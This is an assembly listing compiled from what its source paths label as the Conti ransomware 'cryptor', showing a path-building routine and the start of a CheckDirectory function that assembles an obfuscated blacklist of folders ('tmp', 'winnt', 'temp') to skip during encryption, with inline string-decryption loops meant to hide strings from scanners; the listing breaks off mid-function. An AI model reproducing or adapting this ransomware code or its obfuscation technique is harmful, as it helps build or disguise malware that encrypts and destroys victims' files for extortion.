; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  002a3	48 8b 4d bf	 mov	 rcx, QWORD PTR $T11[rbp-137]
  002a7	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  002af	48 8b c1	 mov	 rax, rcx

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  002b2	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  002b9	72 19		 jb	 SHORT $LN170@MakePath

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  002bb	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  002bf	48 83 c2 27	 add	 rdx, 39			; 00000027H
  002c3	48 2b c1	 sub	 rax, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  002c6	48 83 c0 f8	 add	 rax, -8
  002ca	48 83 f8 1f	 cmp	 rax, 31
  002ce	0f 87 10 01 00
	00		 ja	 $LN196@MakePath
$LN170@MakePath:

; 268  :         ::operator delete(_Ptr, _Bytes);

  002d4	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN171@MakePath:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  002d9	66 0f 6f 05 00
	00 00 00	 movdqa	 xmm0, XMMWORD PTR __xmm@00000000000000070000000000000000
  002e1	f3 0f 7f 45 cf	 movdqu	 XMMWORD PTR $T11[rbp-121], xmm0

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  002e6	66 44 89 6d bf	 mov	 WORD PTR $T11[rbp-137], r13w
$LN174@MakePath:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 34   : 	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;

  002eb	f6 c3 01	 test	 bl, 1
  002ee	74 40		 je	 SHORT $LN200@MakePath
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  002f0	48 8b 55 17	 mov	 rdx, QWORD PTR $T6[rbp-113]
  002f4	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  002f8	76 36		 jbe	 SHORT $LN200@MakePath
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  002fa	48 8b 4d ff	 mov	 rcx, QWORD PTR $T6[rbp-137]
  002fe	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  00306	48 8b c1	 mov	 rax, rcx

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00309	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00310	72 19		 jb	 SHORT $LN199@MakePath

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00312	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  00316	48 83 c2 27	 add	 rdx, 39			; 00000027H
  0031a	48 2b c1	 sub	 rax, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0031d	48 83 c0 f8	 add	 rax, -8
  00321	48 83 f8 1f	 cmp	 rax, 31
  00325	0f 87 b9 00 00
	00		 ja	 $LN196@MakePath
$LN199@MakePath:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0032b	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN200@MakePath:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00330	48 8b 57 18	 mov	 rdx, QWORD PTR [rdi+24]
  00334	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00338	76 35		 jbe	 SHORT $LN229@MakePath
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  0033a	48 8b 0f	 mov	 rcx, QWORD PTR [rdi]
  0033d	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00345	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  0034c	72 1c		 jb	 SHORT $LN228@MakePath

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0034e	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  00352	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00356	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00359	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  0035d	48 83 f8 1f	 cmp	 rax, 31
  00361	0f 87 83 00 00
	00		 ja	 $LN254@MakePath

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00367	49 8b c8	 mov	 rcx, r8
$LN228@MakePath:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0036a	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN229@MakePath:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  0036f	4c 89 6f 10	 mov	 QWORD PTR [rdi+16], r13

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00373	48 c7 47 18 07
	00 00 00	 mov	 QWORD PTR [rdi+24], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0037b	66 44 89 2f	 mov	 WORD PTR [rdi], r13w

; 2244 :         return _Myres > _Small_string_capacity;

  0037f	48 8b 56 18	 mov	 rdx, QWORD PTR [rsi+24]
  00383	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00387	76 31		 jbe	 SHORT $LN258@MakePath
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00389	48 8b 0e	 mov	 rcx, QWORD PTR [rsi]
  0038c	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00394	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  0039b	72 18		 jb	 SHORT $LN257@MakePath

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0039d	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  003a1	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  003a5	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  003a8	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  003ac	48 83 f8 1f	 cmp	 rax, 31
  003b0	77 38		 ja	 SHORT $LN254@MakePath

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  003b2	49 8b c8	 mov	 rcx, r8
$LN257@MakePath:

; 268  :         ::operator delete(_Ptr, _Bytes);

  003b5	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN258@MakePath:
  003ba	48 8b 9c 24 08
	01 00 00	 mov	 rbx, QWORD PTR [rsp+264]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 35   : 	return Path;

  003c2	49 8b c4	 mov	 rax, r12
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  003c5	4c 89 6e 10	 mov	 QWORD PTR [rsi+16], r13

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  003c9	48 c7 46 18 07
	00 00 00	 mov	 QWORD PTR [rsi+24], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  003d1	66 44 89 2e	 mov	 WORD PTR [rsi], r13w
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 36   : }

  003d5	48 81 c4 c0 00
	00 00		 add	 rsp, 192		; 000000c0H
  003dc	41 5d		 pop	 r13
  003de	41 5c		 pop	 r12
  003e0	5f		 pop	 rdi
  003e1	5e		 pop	 rsi
  003e2	5d		 pop	 rbp
  003e3	c3		 ret	 0
$LN196@MakePath:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  003e4	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  003e9	cc		 int	 3
$LN254@MakePath:
  003ea	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  003ef	cc		 int	 3
$LN274@MakePath:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4973 :         _Xlen_string();

  003f0	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  003f5	cc		 int	 3
$LN302@MakePath:
?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z ENDP ; MakePath
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?CheckDirectory@@YAHPEB_W@Z
_TEXT	SEGMENT
$T1 = 32
$T3 = 48
$T8 = 64
$T2 = 80
$T4 = 96
$T9 = 112
$T11 = 136
$T10 = 160
$T5 = 192
$T6 = 224
$T7 = 256
BlackList$ = 320
Directory$ = 432
?CheckDirectory@@YAHPEB_W@Z PROC			; CheckDirectory, COMDAT

; 41   : {

$LN654:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 7c 24 10	 mov	 QWORD PTR [rsp+16], rdi
  0000a	55		 push	 rbp
  0000b	48 8d ac 24 60
	ff ff ff	 lea	 rbp, QWORD PTR [rsp-160]
  00013	48 81 ec a0 01
	00 00		 sub	 rsp, 416		; 000001a0H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0001a	c6 44 24 20 00	 mov	 BYTE PTR $T1[rsp], 0

; 63   :         if (!isDecrypted())

  0001f	33 db		 xor	 ebx, ebx

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00021	c6 44 24 21 65	 mov	 BYTE PTR $T1[rsp+1], 101 ; 00000065H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 41   : {

  00026	48 8b f9	 mov	 rdi, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00029	c6 44 24 22 38	 mov	 BYTE PTR $T1[rsp+2], 56	; 00000038H
  0002e	c6 44 24 23 5f	 mov	 BYTE PTR $T1[rsp+3], 95	; 0000005fH
  00033	c6 44 24 24 38	 mov	 BYTE PTR $T1[rsp+4], 56	; 00000038H
  00038	c6 44 24 25 19	 mov	 BYTE PTR $T1[rsp+5], 25
  0003d	c6 44 24 26 38	 mov	 BYTE PTR $T1[rsp+6], 56	; 00000038H
  00042	c6 44 24 27 38	 mov	 BYTE PTR $T1[rsp+7], 56	; 00000038H
  00047	c6 44 24 28 38	 mov	 BYTE PTR $T1[rsp+8], 56	; 00000038H
  0004c	0f b6 44 24 21	 movzx	 eax, BYTE PTR $T1[rsp+1]

; 58   :         return m_isDecrypted;

  00051	0f b6 44 24 20	 movzx	 eax, BYTE PTR $T1[rsp]

; 63   :         if (!isDecrypted())

  00056	84 c0		 test	 al, al
  00058	75 5a		 jne	 SHORT $LN29@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0005a	44 8b c3	 mov	 r8d, ebx
  0005d	0f 1f 00	 npad	 3
$LL30@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00060	42 0f b6 4c 04
	21		 movzx	 ecx, BYTE PTR $T1[rsp+r8+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00066	b8 38 00 00 00	 mov	 eax, 56			; 00000038H
  0006b	2b c1		 sub	 eax, ecx
  0006d	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00070	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00075	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  00078	f7 e9		 imul	 ecx
  0007a	03 d1		 add	 edx, ecx
  0007c	c1 fa 06	 sar	 edx, 6
  0007f	8b c2		 mov	 eax, edx
  00081	c1 e8 1f	 shr	 eax, 31
  00084	03 d0		 add	 edx, eax
  00086	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00089	2b c8		 sub	 ecx, eax
  0008b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00090	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00093	f7 e9		 imul	 ecx
  00095	03 d1		 add	 edx, ecx
  00097	c1 fa 06	 sar	 edx, 6
  0009a	8b c2		 mov	 eax, edx
  0009c	c1 e8 1f	 shr	 eax, 31
  0009f	03 d0		 add	 edx, eax
  000a1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000a4	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000a6	42 88 4c 04 21	 mov	 BYTE PTR $T1[rsp+r8+1], cl
  000ab	49 ff c0	 inc	 r8
  000ae	49 83 f8 08	 cmp	 r8, 8
  000b2	72 ac		 jb	 SHORT $LL30@CheckDirec
$LN29@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 45   : 		OBFW(L"tmp"),

  000b4	48 8d 44 24 21	 lea	 rax, QWORD PTR $T1[rsp+1]
  000b9	48 89 45 40	 mov	 QWORD PTR BlackList$[rbp-256], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  000bd	88 5c 24 50	 mov	 BYTE PTR $T2[rsp], bl
  000c1	c6 44 24 51 2b	 mov	 BYTE PTR $T2[rsp+1], 43	; 0000002bH
  000c6	c6 44 24 52 25	 mov	 BYTE PTR $T2[rsp+2], 37	; 00000025H
  000cb	c6 44 24 53 75	 mov	 BYTE PTR $T2[rsp+3], 117 ; 00000075H
  000d0	c6 44 24 54 25	 mov	 BYTE PTR $T2[rsp+4], 37	; 00000025H
  000d5	c6 44 24 55 12	 mov	 BYTE PTR $T2[rsp+5], 18
  000da	c6 44 24 56 25	 mov	 BYTE PTR $T2[rsp+6], 37	; 00000025H
  000df	c6 44 24 57 12	 mov	 BYTE PTR $T2[rsp+7], 18
  000e4	c6 44 24 58 25	 mov	 BYTE PTR $T2[rsp+8], 37	; 00000025H
  000e9	c6 44 24 59 4d	 mov	 BYTE PTR $T2[rsp+9], 77	; 0000004dH
  000ee	c6 44 24 5a 25	 mov	 BYTE PTR $T2[rsp+10], 37 ; 00000025H
  000f3	c6 44 24 5b 25	 mov	 BYTE PTR $T2[rsp+11], 37 ; 00000025H
  000f8	c6 44 24 5c 25	 mov	 BYTE PTR $T2[rsp+12], 37 ; 00000025H
  000fd	0f b6 44 24 51	 movzx	 eax, BYTE PTR $T2[rsp+1]

; 58   :         return m_isDecrypted;

  00102	0f b6 44 24 50	 movzx	 eax, BYTE PTR $T2[rsp]

; 63   :         if (!isDecrypted())

  00107	84 c0		 test	 al, al
  00109	75 5a		 jne	 SHORT $LN67@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0010b	4c 8b cb	 mov	 r9, rbx
  0010e	66 90		 npad	 2
$LL68@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00110	42 0f b6 4c 0c
	51		 movzx	 ecx, BYTE PTR $T2[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  00116	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0011b	83 e9 25	 sub	 ecx, 37			; 00000025H
  0011e	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00122	41 f7 e8	 imul	 r8d
  00125	41 03 d0	 add	 edx, r8d
  00128	c1 fa 06	 sar	 edx, 6
  0012b	8b c2		 mov	 eax, edx
  0012d	c1 e8 1f	 shr	 eax, 31
  00130	03 d0		 add	 edx, eax
  00132	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00135	44 2b c0	 sub	 r8d, eax
  00138	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0013d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00141	41 f7 e8	 imul	 r8d
  00144	41 03 d0	 add	 edx, r8d
  00147	c1 fa 06	 sar	 edx, 6
  0014a	8b c2		 mov	 eax, edx
  0014c	c1 e8 1f	 shr	 eax, 31
  0014f	03 d0		 add	 edx, eax
  00151	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00154	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00157	46 88 44 0c 51	 mov	 BYTE PTR $T2[rsp+r9+1], r8b
  0015c	49 ff c1	 inc	 r9
  0015f	49 83 f9 0c	 cmp	 r9, 12
  00163	72 ab		 jb	 SHORT $LL68@CheckDirec
$LN67@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 46   : 		OBFW(L"winnt"),

  00165	48 8d 44 24 51	 lea	 rax, QWORD PTR $T2[rsp+1]
  0016a	48 89 45 48	 mov	 QWORD PTR BlackList$[rbp-248], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0016e	88 5c 24 30	 mov	 BYTE PTR $T3[rsp], bl
  00172	c6 44 24 31 29	 mov	 BYTE PTR $T3[rsp+1], 41	; 00000029H
  00177	c6 44 24 32 04	 mov	 BYTE PTR $T3[rsp+2], 4
  0017c	c6 44 24 33 67	 mov	 BYTE PTR $T3[rsp+3], 103 ; 00000067H
  00181	c6 44 24 34 04	 mov	 BYTE PTR $T3[rsp+4], 4
  00186	c6 44 24 35 35	 mov	 BYTE PTR $T3[rsp+5], 53	; 00000035H
  0018b	c6 44 24 36 04	 mov	 BYTE PTR $T3[rsp+6], 4
  00190	c6 44 24 37 42	 mov	 BYTE PTR $T3[rsp+7], 66	; 00000042H
  00195	c6 44 24 38 04	 mov	 BYTE PTR $T3[rsp+8], 4
  0019a	c6 44 24 39 04	 mov	 BYTE PTR $T3[rsp+9], 4
  0019f	c6 44 24 3a 04	 mov	 BYTE PTR $T3[rsp+10], 4
  001a4	0f b6 44 24 31	 movzx	 eax, BYTE PTR $T3[rsp+1]

; 58   :         return m_isDecrypted;

  001a9	0f b6 44 24 30	 movzx	 eax, BYTE PTR $T3[rsp]

; 63   :         if (!isDecrypted())

  001ae	84 c0		 test	 al, al
  001b0	75 66		 jne	 SHORT $LN101@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  001b2	4c 8b cb	 mov	 r9, rbx
  001b5	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL102@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001c0	42 0f b6 4c 0c
	31		 movzx	 ecx, BYTE PTR $T3[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  001c6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  001cb	83 e9 04	 sub	 ecx, 4
  001ce	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  001d2	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  001d5	41 f7 e8	 imul	 r8d
  001d8	41 03 d0	 add	 edx, r8d
  001db	c1 fa 06	 sar	 edx, 6
  001de	8b c2		 mov	 eax, edx
  001e0	c1 e8 1f	 shr	 eax, 31
  001e3	03 d0		 add	 edx, eax
  001e5	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  001e8	44 2b c0	 sub	 r8d, eax
  001eb	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  001f0	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  001f4	41 f7 e8	 imul	 r8d
  001f7	41 03 d0	 add	 edx, r8d
  001fa	c1 fa 06	 sar	 edx, 6
  001fd	8b c2		 mov	 eax, edx
  001ff	c1 e8 1f	 shr	 eax, 31
  00202	03 d0		 add	 edx, eax
  00204	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00207	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0020a	46 88 44 0c 31	 mov	 BYTE PTR $T3[rsp+r9+1], r8b
  0020f	49 ff c1	 inc	 r9
  00212	49 83 f9 0a	 cmp	 r9, 10
  00216	72 a8		 jb	 SHORT $LL102@CheckDirec
$LN101@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 47   : 		OBFW(L"temp"),

  00218	48 8d 44 24 31	 lea	 rax, QWORD PTR $T3[rsp+1]
  0021d	48 89 45 50	 mov	 QWORD PTR BlackList$[rbp-240], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00221	88 5c 24 60	 mov	 BYTE PTR $T4[rsp], bl
  00225	c6 44 24 61 6f	 mov	 BYTE PTR $T4[rsp+1], 111 ; 0000006fH
  0022a	c6 44 24 62 7d	 mov	 BYTE PTR $T4[rsp+2], 125 ; 0000007dH
  0022f	c6 44 24 63 26	 mov	 BYTE PTR $T4[rsp+3], 38	; 00000026H
  00234	c6 44 24 64 7d	 mov	 BYTE PTR $T4[rsp+4], 125 ; 0000007dH
  00239	c6 44 24 65 2b	 mov	 BYTE PTR $T4[rsp+5], 43	; 0000002bH
  0023e	c6 44 24 66 7d	 mov	 BYTE PTR $T4[rsp+6], 125 ; 0000007dH
  00243	c6 44 24 67 4f	 mov	 BYTE PTR $T4[rsp+7], 79	; 0000004fH
  00248	c6 44 24 68 7d	 mov	 BYTE PTR $T4[rsp+8], 125 ; 0000007dH
  0024d	c6 44 24 69 41	 mov	 BYTE PTR $T4[rsp+9], 65	; 00000041H
  00252	c6 44 24 6a 7d	 mov	 BYTE PTR $T4[rsp+10], 125 ; 0000007dH
  00257	c6 44 24 6b 7d	 mov	 BYTE PTR $T4[rsp+11], 125 ; 0000007dH
  0025c	c6 44 24 6c 7d	 mov	 BYTE PTR $T4[rsp+12], 125 ; 0000007dH
  00261	0f b6 44 24 61	 movzx	 eax, BYTE PTR $T4[rsp+1]

; 58   :         return m_isDecrypted;

  00266	0f b6 44 24 60	 movzx	 eax, BYTE PTR $T4[rsp]

; 63   :         if (!isDecrypted())

  0026b	84 c0		 test	 al, al
  0026d	75 58		 jne	 SHORT $LN139@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0026f	4c 8b cb	 mov	 r9, rbx
$LL140@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00272	42 0f b6 4c 0c
	61		 movzx	 ecx, BYTE PTR $T4[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  00278	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0027d	83 e9 7d	 sub	 ecx, 125		; 0000007dH
  00280	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  00284	41 f7 e8	 imul	 r8d
  00287	41 03 d0	 add	 edx, r8d
  0028a	c1 fa 06	 sar	 edx, 6
  0028d	8b c2		 mov	 eax, edx
  0028f	c1 e8 1f	 shr	 eax, 31
  00292	03 d0		 add	 edx, eax
  00294	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00297	44 2b c0	 sub	 r8d, eax
  0029a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0029f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  002a3	41 f7 e8	 imul	 r8d
  002a6	41 03 d0	 add	 edx, r8d
  002a9	c1 fa 06	 sar	 edx, 6
  002ac	8b c2		 mov	 eax, edx
